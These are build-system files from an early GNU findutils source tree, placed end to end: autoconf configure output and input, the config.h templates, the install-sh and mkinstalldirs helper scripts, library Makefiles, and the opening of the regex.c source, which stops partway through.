# Let make expand exec_prefix.
test "x$exec_prefix" = xNONE && exec_prefix='${prefix}'

# Any assignment to VPATH causes Sun make to only execute
# the first set of double-colon rules, so remove it if not needed.
# If there is a colon in the path, we need to keep it.
if test "x$srcdir" = x.; then
  ac_vpsub='/^[ 	]*VPATH[ 	]*=[^:]*$/d'
fi

trap 'rm -f $CONFIG_STATUS conftest*; exit 1' 1 2 15

DEFS=-DHAVE_CONFIG_H

# Without the "./", some shells look in PATH for config.status.
: ${CONFIG_STATUS=./config.status}

echo creating $CONFIG_STATUS
rm -f $CONFIG_STATUS
cat > $CONFIG_STATUS <<EOF
#!/bin/sh
# Generated automatically by configure.
# Run this file to recreate the current configuration.
# This directory was configured as follows,
# on host `(hostname || uname -n) 2>/dev/null | sed 1q`:
#
# $0 $ac_configure_args
#
# Compiler output produced by configure, useful for debugging
# configure, is in ./config.log if it exists.

ac_cs_usage="Usage: $CONFIG_STATUS [--recheck] [--version] [--help]"
for ac_option
do
  case "\$ac_option" in
  -recheck | --recheck | --rechec | --reche | --rech | --rec | --re | --r)
    echo "running \${CONFIG_SHELL-/bin/sh} $0 $ac_configure_args --no-create --no-recursion"
    exec \${CONFIG_SHELL-/bin/sh} $0 $ac_configure_args --no-create --no-recursion ;;
  -version | --version | --versio | --versi | --vers | --ver | --ve | --v)
    echo "$CONFIG_STATUS generated by autoconf version 2.1"
    exit 0 ;;
  -help | --help | --hel | --he | --h)
    echo "\$ac_cs_usage"; exit 0 ;;
  *) echo "\$ac_cs_usage"; exit 1 ;;
  esac
done

ac_given_srcdir=$srcdir
ac_given_INSTALL="$INSTALL"

trap 'rm -fr Makefile lib/Makefile find/Makefile xargs/Makefile \
locate/Makefile doc/Makefile testsuite/Makefile config.h conftest*; exit 1' 1 2 15

# Protect against being on the right side of a sed subst in config.status. 
sed 's/%@/@@/; s/@%/@@/; s/%g$/@g/; /@g$/s/[\\\\&%]/\\\\&/g; 
 s/@@/%@/; s/@@/@%/; s/@g$/%g/' > conftest.subs <<\CEOF
$ac_vpsub
$extrasub
s%@CFLAGS@%$CFLAGS%g
s%@CPPFLAGS@%$CPPFLAGS%g
s%@CXXFLAGS@%$CXXFLAGS%g
s%@DEFS@%$DEFS%g
s%@LDFLAGS@%$LDFLAGS%g
s%@LIBS@%$LIBS%g
s%@exec_prefix@%$exec_prefix%g
s%@prefix@%$prefix%g
s%@program_transform_name@%$program_transform_name%g
s%@INCLUDES@%$INCLUDES%g
s%@CC@%$CC%g
s%@CPP@%$CPP%g
s%@INSTALL_PROGRAM@%$INSTALL_PROGRAM%g
s%@INSTALL_DATA@%$INSTALL_DATA%g
s%@RANLIB@%$RANLIB%g
s%@SET_MAKE@%$SET_MAKE%g
s%@LIBOBJS@%$LIBOBJS%g
s%@ALLOCA@%$ALLOCA%g

CEOF
EOF
cat >> $CONFIG_STATUS <<EOF

CONFIG_FILES=\${CONFIG_FILES-"Makefile lib/Makefile find/Makefile xargs/Makefile \
locate/Makefile doc/Makefile testsuite/Makefile"}
EOF
cat >> $CONFIG_STATUS <<\EOF
for ac_file in .. $CONFIG_FILES; do if test "x$ac_file" != x..; then
  # Support "outfile[:infile]", defaulting infile="outfile.in".
  case "$ac_file" in
  *:*) ac_file_in=`echo "$ac_file"|sed 's%.*:%%'`
       ac_file=`echo "$ac_file"|sed 's%:.*%%'` ;;
  *) ac_file_in="${ac_file}.in" ;;
  esac

  # Adjust relative srcdir, etc. for subdirectories.

  # Remove last slash and all that follows it.  Not all systems have dirname.
  ac_dir=`echo $ac_file|sed 's%/[^/][^/]*$%%'`
  if test "$ac_dir" != "$ac_file" && test "$ac_dir" != .; then
    # The file is in a subdirectory.
    test ! -d "$ac_dir" && mkdir "$ac_dir"
    ac_dir_suffix="/$ac_dir"
    # A "../" for each directory in $ac_dir_suffix.
    ac_dots=`echo $ac_dir_suffix|sed 's%/[^/]*%../%g'`
  else
    ac_dir_suffix= ac_dots=
  fi

  case "$ac_given_srcdir" in
  .)  srcdir=.
      if test -z "$ac_dots"; then top_srcdir=.
      else top_srcdir=`echo $ac_dots|sed 's%/$%%'`; fi ;;
  /*) srcdir="$ac_given_srcdir$ac_dir_suffix"; top_srcdir="$ac_given_srcdir" ;;
  *) # Relative path.
    srcdir="$ac_dots$ac_given_srcdir$ac_dir_suffix"
    top_srcdir="$ac_dots$ac_given_srcdir" ;;
  esac

  case "$ac_given_INSTALL" in
  [/$]*) INSTALL="$ac_given_INSTALL" ;;
  *) INSTALL="$ac_dots$ac_given_INSTALL" ;;
  esac
  echo creating "$ac_file"
  rm -f "$ac_file"
  configure_input="Generated automatically from `echo $ac_file_in|sed 's%.*/%%'` by configure."
  case "$ac_file" in
  *Makefile*) ac_comsub="1i\\
# $configure_input" ;;
  *) ac_comsub= ;;
  esac
  sed -e "$ac_comsub
s%@configure_input@%$configure_input%g
s%@srcdir@%$srcdir%g
s%@top_srcdir@%$top_srcdir%g
s%@INSTALL@%$INSTALL%g
" -f conftest.subs $ac_given_srcdir/$ac_file_in > $ac_file
fi; done
rm -f conftest.subs

# These sed commands are passed to sed as "A NAME B NAME C VALUE D", where
# NAME is the cpp macro being defined and VALUE is the value it is being given.
#
# ac_d sets the value in "#define NAME VALUE" lines.
ac_dA='s%^\([ 	]*\)#\([ 	]*define[ 	][ 	]*\)'
ac_dB='\([ 	][ 	]*\)[^ 	]*%\1#\2'
ac_dC='\3'
ac_dD='%g'
# ac_u turns "#undef NAME" with trailing blanks into "#define NAME VALUE".
ac_uA='s%^\([ 	]*\)#\([ 	]*\)undef\([ 	][ 	]*\)'
ac_uB='\([ 	]\)%\1#\2define\3'
ac_uC=' '
ac_uD='\4%g'
# ac_e turns "#undef NAME" without trailing blanks into "#define NAME VALUE".
ac_eA='s%^\([ 	]*\)#\([ 	]*\)undef\([ 	][ 	]*\)'
ac_eB='$%\1#\2define\3'
ac_eC=' '
ac_eD='%g'

CONFIG_HEADERS=${CONFIG_HEADERS-"config.h"}
for ac_file in .. $CONFIG_HEADERS; do if test "x$ac_file" != x..; then
  # Support "outfile[:infile]", defaulting infile="outfile.in".
  case "$ac_file" in
  *:*) ac_file_in=`echo "$ac_file"|sed 's%.*:%%'`
       ac_file=`echo "$ac_file"|sed 's%:.*%%'` ;;
  *) ac_file_in="${ac_file}.in" ;;
  esac

  echo creating $ac_file

  rm -f conftest.frag conftest.in conftest.out
  cp $ac_given_srcdir/$ac_file_in conftest.in

EOF

# Transform confdefs.h into a sed script conftest.vals that substitutes
# the proper values into config.h.in to produce config.h.  And first:
# Protect against being on the right side of a sed subst in config.status. 
# Protect against being in an unquoted here document in config.status.
rm -f conftest.vals
cat > conftest.hdr <<\EOF
s/[\\&%]/\\&/g
s%[\\$`]%\\&%g
s%#define \([A-Za-z_][A-Za-z0-9_]*\) \(.*\)%${ac_dA}\1${ac_dB}\1${ac_dC}\2${ac_dD}%gp
s%ac_d%ac_u%gp
s%ac_u%ac_e%gp
EOF
sed -n -f conftest.hdr confdefs.h > conftest.vals
rm -f conftest.hdr

# This sed command replaces #undef with comments.  This is necessary, for
# example, in the case of _POSIX_SOURCE, which is predefined and required
# on some systems where configure will not decide to define it.
cat >> conftest.vals <<\EOF
s%^[ 	]*#[ 	]*undef[ 	][ 	]*[a-zA-Z_][a-zA-Z_0-9]*%/* & */%
EOF

# Break up conftest.vals because some shells have a limit on
# the size of here documents, and old seds have small limits too.
# Maximum number of lines to put in a single here document.
ac_max_here_lines=12

rm -f conftest.tail
while :
do
  ac_lines=`grep -c . conftest.vals`
  # grep -c gives empty output for an empty file on some AIX systems.
  if test -z "$ac_lines" || test "$ac_lines" -eq 0; then break; fi
  # Write a limited-size here document to conftest.frag.
  echo '  cat > conftest.frag <<CEOF' >> $CONFIG_STATUS
  sed ${ac_max_here_lines}q conftest.vals >> $CONFIG_STATUS
  echo 'CEOF
  sed -f conftest.frag conftest.in > conftest.out
  rm -f conftest.in
  mv conftest.out conftest.in
' >> $CONFIG_STATUS
  sed 1,${ac_max_here_lines}d conftest.vals > conftest.tail
  rm -f conftest.vals
  mv conftest.tail conftest.vals
done
rm -f conftest.vals

cat >> $CONFIG_STATUS <<\EOF
  rm -f conftest.frag conftest.h
  echo "/* $ac_file.  Generated automatically by configure.  */" > conftest.h
  cat conftest.in >> conftest.h
  rm -f conftest.in
  if cmp -s $ac_file conftest.h 2>/dev/null; then
    echo "$ac_file is unchanged"
    rm -f conftest.h
  else
    rm -f $ac_file
    mv conftest.h $ac_file
  fi
fi; done


date > stamp-h
exit 0
EOF
chmod +x $CONFIG_STATUS
rm -fr confdefs* $ac_clean_files
test "$no_create" = yes || ${CONFIG_SHELL-/bin/sh} $CONFIG_STATUS

dnl Process this file with autoconf to produce a configure script.
AC_INIT(find/pred.c)
AC_CONFIG_HEADER(config.h)

AC_SUBST(INCLUDES)dnl
AC_ARG_ENABLE(id-cache,
[  --enable-id-cache       cache all UIDs & GIDs; avoid if using NIS or Hesiod],
  AC_DEFINE(CACHE_IDS))
AC_ARG_WITH(afs,
[  --with-afs              support -fstype afs],
[  AC_DEFINE(AFS)
  CPPFLAGS="$CPPFLAGS -I/usr/afsws/include"
  LIBS="$LIBS -L/usr/afsws/lib -L/usr/afsws/lib/afs -lsys -lrx -llwp"])
AC_ARG_PROGRAM

dnl Checks for programs.
AC_PROG_CC
AC_PROG_CPP
AC_PROG_INSTALL
AC_PROG_RANLIB
AC_PROG_MAKE_SET

dnl Try to get a POSIX.1 environment.
AC_AIX
AC_MINIX
AC_ISC_POSIX

dnl Checks for libraries.
AC_CHECK_LIB(sun, getpwnam)

dnl Checks for header files.
AC_CHECK_HEADERS(fcntl.h string.h limits.h unistd.h)
AC_HEADER_STDC
AC_HEADER_MAJOR
AC_HEADER_DIRENT
AC_HEADER_STAT
AC_HEADER_SYS_WAIT

AC_MSG_CHECKING(how to get filesystem type)
fstype=no
# The order of these tests is important.
AC_TRY_CPP([#include <sys/statvfs.h>
#include <sys/fstyp.h>], AC_DEFINE(FSTYPE_STATVFS) fstype=SVR4)
if test $fstype = no; then
AC_TRY_CPP([#include <sys/statfs.h>
#include <sys/fstyp.h>], AC_DEFINE(FSTYPE_USG_STATFS) fstype=SVR3)
fi
if test $fstype = no; then
AC_TRY_CPP([#include <sys/statfs.h>
#include <sys/vmount.h>], AC_DEFINE(FSTYPE_AIX_STATFS) fstype=AIX)
fi
if test $fstype = no; then  
AC_TRY_CPP([#include <mntent.h>], AC_DEFINE(FSTYPE_MNTENT) fstype=4.3BSD)
fi
if test $fstype = no; then  
AC_EGREP_HEADER(f_type;, sys/mount.h, AC_DEFINE(FSTYPE_STATFS) fstype=4.4BSD/OSF1)
fi
if test $fstype = no; then  
AC_TRY_CPP([#include <sys/mount.h>
#include <sys/fs_types.h>], AC_DEFINE(FSTYPE_GETMNT) fstype=Ultrix)
fi
AC_MSG_RESULT($fstype)

dnl Checks for typedefs, structures, and compiler characteristics.

AC_TYPE_UID_T
AC_TYPE_SIZE_T
AC_TYPE_PID_T
AC_CHECK_TYPE(ino_t, unsigned long)
AC_CHECK_TYPE(dev_t, unsigned long)
AC_STRUCT_ST_BLOCKS
AC_STRUCT_ST_RDEV
AC_STRUCT_TM
AC_STRUCT_TIMEZONE
AC_C_CONST

dnl Checks for library functions.

AC_REPLACE_FUNCS(memcmp memset mktime stpcpy strdup strftime strspn strstr strtol)
AC_CHECK_FUNCS(fchdir getcwd strerror)
AC_FUNC_STRFTIME
AC_FUNC_VPRINTF
AC_FUNC_ALLOCA
AC_FUNC_GETMNTENT
AC_FUNC_CLOSEDIR_VOID

AC_OUTPUT(Makefile lib/Makefile find/Makefile xargs/Makefile \
locate/Makefile doc/Makefile testsuite/Makefile,
  date > stamp-h)
/* Entries for config.h.in that aren't automatically generated.  */

/* Define if you have the Andrew File System.  */
#undef AFS

/* Define If you want find -nouser and -nogroup to make tables of
   used UIDs and GIDs at startup instead of using getpwuid or
   getgrgid when needed.  Speeds up -nouser and -nogroup unless you
   are running NIS or Hesiod, which make password and group calls
   very expensive.  */
#undef CACHE_IDS

/* Define to use SVR4 statvfs to get filesystem type.  */
#undef FSTYPE_STATVFS

/* Define to use SVR3.2 statfs to get filesystem type.  */
#undef FSTYPE_USG_STATFS

/* Define to use AIX3 statfs to get filesystem type.  */
#undef FSTYPE_AIX_STATFS

/* Define to use 4.3BSD getmntent to get filesystem type.  */
#undef FSTYPE_MNTENT

/* Define to use 4.4BSD and OSF1 statfs to get filesystem type.  */
#undef FSTYPE_STATFS

/* Define to use Ultrix getmnt to get filesystem type.  */
#undef FSTYPE_GETMNT

/* Define to `unsigned long' if <sys/types.h> doesn't define.  */
#undef dev_t

/* Define to `unsigned long' if <sys/types.h> doesn't define.  */
#undef ino_t

#!/bin/sh
# mkinstalldirs --- make directory hierarchy
# Author: Noah Friedman <friedman@prep.ai.mit.edu>
# Created: 1993-05-16
# Last modified: 1994-03-25
# Public domain

errstatus=0

for file in ${1+"$@"} ; do 
   set fnord `echo ":$file" | sed -ne 's/^:\//#/;s/^://;s/\// /g;s/^#/\//;p'`
   shift

   pathcomp=
   for d in ${1+"$@"} ; do
     pathcomp="$pathcomp$d"
     case "$pathcomp" in
       -* ) pathcomp=./$pathcomp ;;
     esac

     if test ! -d "$pathcomp"; then
        echo "mkdir $pathcomp" 1>&2
        mkdir "$pathcomp" || errstatus=$?
     fi

     pathcomp="$pathcomp/"
   done
done

exit $errstatus

# mkinstalldirs ends here
#!/bin/sh
#
# install - install a program, script, or datafile
# This comes from X11R5.
#
# Calling this script install-sh is preferred over install.sh, to prevent
# `make' implicit rules from creating a file called install from it
# when there is no Makefile.
#
# This script is compatible with the BSD install script, but was written
# from scratch.
#


# set DOITPROG to echo to test this script

# Don't use :- since 4.3BSD and earlier shells don't like it.
doit="${DOITPROG-}"


# put in absolute paths if you don't have them in your path; or use env. vars.

mvprog="${MVPROG-mv}"
cpprog="${CPPROG-cp}"
chmodprog="${CHMODPROG-chmod}"
chownprog="${CHOWNPROG-chown}"
chgrpprog="${CHGRPPROG-chgrp}"
stripprog="${STRIPPROG-strip}"
rmprog="${RMPROG-rm}"
mkdirprog="${MKDIRPROG-mkdir}"

tranformbasename=""
transform_arg=""
instcmd="$mvprog"
chmodcmd="$chmodprog 0755"
chowncmd=""
chgrpcmd=""
stripcmd=""
rmcmd="$rmprog -f"
mvcmd="$mvprog"
src=""
dst=""
dir_arg=""

while [ x"$1" != x ]; do
    case $1 in
	-c) instcmd="$cpprog"
	    shift
	    continue;;

	-d) dir_arg=true
	    shift
	    continue;;

	-m) chmodcmd="$chmodprog $2"
	    shift
	    shift
	    continue;;

	-o) chowncmd="$chownprog $2"
	    shift
	    shift
	    continue;;

	-g) chgrpcmd="$chgrpprog $2"
	    shift
	    shift
	    continue;;

	-s) stripcmd="$stripprog"
	    shift
	    continue;;

	-t=*) transformarg=`echo $1 | sed 's/-t=//'`
	    shift
	    continue;;

	-b=*) transformbasename=`echo $1 | sed 's/-b=//'`
	    shift
	    continue;;

	*)  if [ x"$src" = x ]
	    then
		src=$1
	    else
		# this colon is to work around a 386BSD /bin/sh bug
		:
		dst=$1
	    fi
	    shift
	    continue;;
    esac
done

if [ x"$src" = x ]
then
	echo "install:	no input file specified"
	exit 1
else
	true
fi

if [ x"$dir_arg" != x ]; then
	dst=$src
	src=""
	
	if [ -d $dst ]; then
		instcmd=:
	else
		instcmd=mkdir
	fi
else

# Waiting for this to be detected by the "$instcmd $src $dsttmp" command
# might cause directories to be created, which would be especially bad 
# if $src (and thus $dsttmp) contains '*'.

	if [ -f $src -o -d $src ]
	then
		true
	else
		echo "install:  $src does not exist"
		exit 1
	fi
	
	if [ x"$dst" = x ]
	then
		echo "install:	no destination specified"
		exit 1
	else
		true
	fi

# If destination is a directory, append the input filename; if your system
# does not like double slashes in filenames, you may need to add some logic

	if [ -d $dst ]
	then
		dst="$dst"/`basename $src`
	else
		true
	fi
fi

## this sed command emulates the dirname command
dstdir=`echo $dst | sed -e 's,[^/]*$,,;s,/$,,;s,^$,.,'`

# Make sure that the destination directory exists.
#  this part is taken from Noah Friedman's mkinstalldirs script

# Skip lots of stat calls in the usual case.
if [ ! -d "$dstdir" ]; then
defaultIFS='	
'
IFS="${IFS-${defaultIFS}}"

oIFS="${IFS}"
# Some sh's can't handle IFS=/ for some reason.
IFS='%'
set - `echo ${dstdir} | sed -e 's@/@%@g' -e 's@^%@/@'`
IFS="${oIFS}"

pathcomp=''

while [ $# -ne 0 ] ; do
	pathcomp="${pathcomp}${1}"
	shift

	if [ ! -d "${pathcomp}" ] ;
        then
		$mkdirprog "${pathcomp}"
	else
		true
	fi

	pathcomp="${pathcomp}/"
done
fi

if [ x"$dir_arg" != x ]
then
	$doit $instcmd $dst &&

	if [ x"$chowncmd" != x ]; then $doit $chowncmd $dst; else true ; fi &&
	if [ x"$chgrpcmd" != x ]; then $doit $chgrpcmd $dst; else true ; fi &&
	if [ x"$stripcmd" != x ]; then $doit $stripcmd $dst; else true ; fi &&
	if [ x"$chmodcmd" != x ]; then $doit $chmodcmd $dst; else true ; fi
else

# If we're going to rename the final executable, determine the name now.

	if [ x"$transformarg" = x ] 
	then
		dstfile=`basename $dst`
	else
		dstfile=`basename $dst $transformbasename | 
			sed $transformarg`$transformbasename
	fi

# don't allow the sed command to completely eliminate the filename

	if [ x"$dstfile" = x ] 
	then
		dstfile=`basename $dst`
	else
		true
	fi

# Make a temp file name in the proper directory.

	dsttmp=$dstdir/#inst.$$#

# Move or copy the file name to the temp name

	$doit $instcmd $src $dsttmp &&

	trap "rm -f ${dsttmp}" 0 &&

# and set any options; do chmod last to preserve setuid bits

# If any of these fail, we abort the whole thing.  If we want to
# ignore errors from any of these, just make sure not to ignore
# errors from the above "$doit $instcmd $src $dsttmp" command.

	if [ x"$chowncmd" != x ]; then $doit $chowncmd $dsttmp; else true;fi &&
	if [ x"$chgrpcmd" != x ]; then $doit $chgrpcmd $dsttmp; else true;fi &&
	if [ x"$stripcmd" != x ]; then $doit $stripcmd $dsttmp; else true;fi &&
	if [ x"$chmodcmd" != x ]; then $doit $chmodcmd $dsttmp; else true;fi &&

# Now rename the file to the real destination.

	$doit $rmcmd -f $dstdir/$dstfile &&
	$doit $mvcmd $dsttmp $dstdir/$dstfile 

fi &&


exit 0
/* config.h.in.  Generated automatically from configure.in by autoheader.  */

/* Define if on AIX 3.
   System headers sometimes define this.
   We just want to avoid a redefinition error message.  */
#ifndef _ALL_SOURCE
#undef _ALL_SOURCE
#endif

/* Define if using alloca.c.  */
#undef C_ALLOCA

/* Define if the closedir function returns void instead of int.  */
#undef CLOSEDIR_VOID

/* Define to empty if the keyword does not work.  */
#undef const

/* Define to one of _getb67, GETB67, getb67 for Cray-2 and Cray-YMP systems.
   This function is required for alloca.c support on those systems.  */
#undef CRAY_STACKSEG_END

/* Define to `int' if <sys/types.h> doesn't define.  */
#undef gid_t

/* Define if you have alloca, as a function or macro.  */
#undef HAVE_ALLOCA

/* Define if you have <alloca.h> and it should be used (not on Ultrix).  */
#undef HAVE_ALLOCA_H

/* Define if you don't have vprintf but do have _doprnt.  */
#undef HAVE_DOPRNT

/* Define if you have the getmntent function.  */
#undef HAVE_GETMNTENT

/* Define if your struct stat has st_blocks.  */
#undef HAVE_ST_BLOCKS

/* Define if your struct stat has st_rdev.  */
#undef HAVE_ST_RDEV

/* Define if you have the strftime function.  */
#undef HAVE_STRFTIME

/* Define if you have <sys/wait.h> that is POSIX.1 compatible.  */
#undef HAVE_SYS_WAIT_H

/* Define if your struct tm has tm_zone.  */
#undef HAVE_TM_ZONE

/* Define if you don't have tm_zone but do have the external array
   tzname.  */
#undef HAVE_TZNAME

/* Define if you have the vprintf function.  */
#undef HAVE_VPRINTF

/* Define if major, minor, and makedev are declared in <mkdev.h>.  */
#undef MAJOR_IN_MKDEV

/* Define if major, minor, and makedev are declared in <sysmacros.h>.  */
#undef MAJOR_IN_SYSMACROS

/* Define if on MINIX.  */
#undef _MINIX

/* Define to `int' if <sys/types.h> doesn't define.  */
#undef pid_t

/* Define if the system does not provide POSIX.1 features except
   with this defined.  */
#undef _POSIX_1_SOURCE

/* Define if you need to in order for stat and other things to work.  */
#undef _POSIX_SOURCE

/* Define to `unsigned' if <sys/types.h> doesn't define.  */
#undef size_t

/* If using the C implementation of alloca, define if you know the
   direction of stack growth for your system; otherwise it will be
   automatically deduced at run-time.
	STACK_DIRECTION > 0 => grows toward higher addresses
	STACK_DIRECTION < 0 => grows toward lower addresses
	STACK_DIRECTION = 0 => direction of growth unknown
 */
#undef STACK_DIRECTION

/* Define if the `S_IS*' macros in <sys/stat.h> do not work properly.  */
#undef STAT_MACROS_BROKEN

/* Define if you have the ANSI C header files.  */
#undef STDC_HEADERS

/* Define if your <sys/time.h> declares struct tm.  */
#undef TM_IN_SYS_TIME

/* Define to `int' if <sys/types.h> doesn't define.  */
#undef uid_t

/* Define if you have the Andrew File System.  */
#undef AFS

/* Define If you want find -nouser and -nogroup to make tables of
   used UIDs and GIDs at startup instead of using getpwuid or
   getgrgid when needed.  Speeds up -nouser and -nogroup unless you
   are running NIS or Hesiod, which make password and group calls
   very expensive.  */
#undef CACHE_IDS

/* Define to use SVR4 statvfs to get filesystem type.  */
#undef FSTYPE_STATVFS

/* Define to use SVR3.2 statfs to get filesystem type.  */
#undef FSTYPE_USG_STATFS

/* Define to use AIX3 statfs to get filesystem type.  */
#undef FSTYPE_AIX_STATFS

/* Define to use 4.3BSD getmntent to get filesystem type.  */
#undef FSTYPE_MNTENT

/* Define to use 4.4BSD and OSF1 statfs to get filesystem type.  */
#undef FSTYPE_STATFS

/* Define to use Ultrix getmnt to get filesystem type.  */
#undef FSTYPE_GETMNT

/* Define to `unsigned long' if <sys/types.h> doesn't define.  */
#undef dev_t

/* Define to `unsigned long' if <sys/types.h> doesn't define.  */
#undef ino_t

/* Define if you have the fchdir function.  */
#undef HAVE_FCHDIR

/* Define if you have the getcwd function.  */
#undef HAVE_GETCWD

/* Define if you have the strerror function.  */
#undef HAVE_STRERROR

/* Define if you have the <dirent.h> header file.  */
#undef HAVE_DIRENT_H

/* Define if you have the <fcntl.h> header file.  */
#undef HAVE_FCNTL_H

/* Define if you have the <limits.h> header file.  */
#undef HAVE_LIMITS_H

/* Define if you have the <ndir.h> header file.  */
#undef HAVE_NDIR_H

/* Define if you have the <string.h> header file.  */
#undef HAVE_STRING_H

/* Define if you have the <sys/dir.h> header file.  */
#undef HAVE_SYS_DIR_H

/* Define if you have the <sys/ndir.h> header file.  */
#undef HAVE_SYS_NDIR_H

/* Define if you have the <unistd.h> header file.  */
#undef HAVE_UNISTD_H

/* Define if you have the sun library (-lsun).  */
#undef HAVE_LIBSUN
Tue Oct  4 11:24:03 EDT 1994
LIBRARIES = find
find_SOURCES = regex.c dirname.c error.c filemode.c getopt.c getopt1.c \
idcache.c listfile.c modechange.c nextelem.c savedir.c xmalloc.c getline.c \
xstrdup.c xgetcwd.c fnmatch.c $(find_OPT_SOURCES)

find_OPT_SOURCES = fileblocks.c memcmp.c memset.c mktime.c stpcpy.c strdup.c \
strftime.c strspn.c strstr.c strtol.c alloca.c

DIST_OTHER = fnmatch.h getopt.h modechange.h modetype.h pathmax.h \
regex.h wait.h

CONFIG_HEADER = ../config.h
INCLUDES = -I.. -I$(srcdir)

fnmatch.o: fnmatch.h
getopt1.o: getopt.h
listfile.o xgetcwd.o: pathmax.h
modechange.o: modechange.h
regex.o: regex.h
# Makefile.in generated automatically by automake from Makefile.am.
# Copyright (C) 1994 Free Software Foundation, Inc.

# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

SHELL = /bin/sh

srcdir = @srcdir@
top_srcdir = @top_srcdir@
VPATH = @srcdir@
prefix = @prefix@
exec_prefix = @exec_prefix@

bindir = $(exec_prefix)/bin
sbindir = $(exec_prefix)/sbin
libexecdir = $(exec_prefix)/libexec
datadir = $(prefix)/share
sysconfdir = $(prefix)/etc
sharedstatedir = $(prefix)/com
localstatedir = $(prefix)/var
libdir = $(exec_prefix)/lib
infodir = $(prefix)/info
mandir = $(prefix)/man
includedir = $(prefix)/include
oldincludedir = /usr/include

INSTALL = @INSTALL@
INSTALL_PROGRAM = @INSTALL_PROGRAM@
INSTALL_DATA = @INSTALL_DATA@
transform = @program_transform_name@

ALL = ${PROGRAMS} ${LIBPROGRAMS} ${SCRIPTS} ${LIBSCRIPTS} ${LIBFILES}
CC = @CC@
LEX = @LEX@
YACC = @YACC@
ANSI2KNR = ./ansi2knr

DEFS = @DEFS@
CPPFLAGS = @CPPFLAGS@
CFLAGS = @CFLAGS@
LDFLAGS = @LDFLAGS@
LIBS = @LIBS@

find_OBJECTS = regex.o dirname.o error.o filemode.o getopt.o getopt1.o idcache.o listfile.o modechange.o nextelem.o savedir.o xmalloc.o getline.o xstrdup.o xgetcwd.o fnmatch.o 
LIBFILES =  libfind.a
AR = ar
RANLIB = @RANLIB@
ALLOCA = @ALLOCA@
LIBOBJS = @LIBOBJS@

SOURCES =  ${find_SOURCES}
DIST_CONF = Makefile.am Makefile.in
DIST_FILES = $(DIST_CONF) $(SOURCES) $(TEXINFOS) $(INFOS) $(MANS) $(DIST_OTHER)

LIBRARIES = find
find_SOURCES = regex.c dirname.c error.c filemode.c getopt.c getopt1.c \
idcache.c listfile.c modechange.c nextelem.c savedir.c xmalloc.c getline.c \
xstrdup.c xgetcwd.c fnmatch.c $(find_OPT_SOURCES)

find_OPT_SOURCES = fileblocks.c memcmp.c memset.c mktime.c stpcpy.c strdup.c \
strftime.c strspn.c strstr.c strtol.c alloca.c

DIST_OTHER = fnmatch.h getopt.h modechange.h modetype.h pathmax.h \
regex.h wait.h

CONFIG_HEADER = ../config.h
INCLUDES = -I.. -I$(srcdir)

all:: ${ALL}

.c.o:
	$(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS) $<

$(find_OBJECTS): ../config.h
install:: install-libraries

install-libraries: $(LIBFILES)

uninstall:: uninstall-libraries

uninstall-libraries:

libfind.a: $(find_OBJECTS) @LIBOBJS@ @ALLOCA@
	rm -f libfind.a
	$(AR) cru libfind.a $(find_OBJECTS) @LIBOBJS@ @ALLOCA@
	$(RANLIB) libfind.a

mostlyclean:
	rm -f *.o core

clean: mostlyclean
	rm -f $(PROGRAMS) $(LIBPROGRAMS) $(LIBFILES) $(TEXFILES) $(CLEANFILES)

distclean: clean
	rm -f Makefile *.tab.c $(DISTCLEANFILES)
	rm -f config.cache config.log config.status ${CONFIG_HEADER} stamp-h

realclean: distclean
	rm -f TAGS $(INFOS)

dist: $(DIST_FILES) $(DIST_DIRS)
	-mkdir ../`cat ../distname`/$(subdir)
	@for file in $(DIST_FILES); do \
	  echo linking $$file; \
	  ln $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file || \
	    { echo copying $$file instead; cp -p $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file;}; \
	done

check dvi info install uninstall::

tags:: TAGS

TAGS::
	cd $(srcdir); etags $(SOURCES)

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

fnmatch.o: fnmatch.h
getopt1.o: getopt.h
listfile.o xgetcwd.o: pathmax.h
modechange.o: modechange.h
regex.o: regex.h
/* Extended regular expression matching and search library,
   version 0.12.
   (Implements POSIX draft P10003.2/D11.2, except for
   internationalization features.)

   Copyright (C) 1993, 1994 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* AIX requires this to be the first thing in the file. */
#if defined (_AIX) && !defined (REGEX_MALLOC)
  #pragma alloca
#endif

#define _GNU_SOURCE

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

/* We need this for `regex.h', and perhaps for the Emacs include files.  */
#include <sys/types.h>

/* The `emacs' switch turns on certain matching commands
   that make sense only in Emacs. */
#ifdef emacs

#include "lisp.h"
#include "buffer.h"
#include "syntax.h"

/* Emacs uses `NULL' as a predicate.  */
#undef NULL

#else  /* not emacs */

#ifdef STDC_HEADERS
#include <stdlib.h>
#else
char *malloc ();
char *realloc ();
#endif


/* We used to test for `BSTRING' here, but only GCC and Emacs define
   `BSTRING', as far as I know, and neither of them use this code.  */
#ifndef INHIBIT_STRING_HEADER
#if HAVE_STRING_H || STDC_HEADERS
#include <string.h>
#ifndef bcmp
#define bcmp(s1, s2, n)	memcmp ((s1), (s2), (n))
#endif
#ifndef bcopy
#define bcopy(s, d, n)	memcpy ((d), (s), (n))
#endif
#ifndef bzero
#define bzero(s, n)	memset ((s), 0, (n))
#endif
#else
#include <strings.h>
#endif
#endif

/* Define the syntax stuff for \<, \>, etc.  */

/* This must be nonzero for the wordchar and notwordchar pattern
   commands in re_match_2.  */
#ifndef Sword 
#define Sword 1
#endif

#ifdef SYNTAX_TABLE

extern char *re_syntax_table;

#else /* not SYNTAX_TABLE */

/* How many characters in the character set.  */
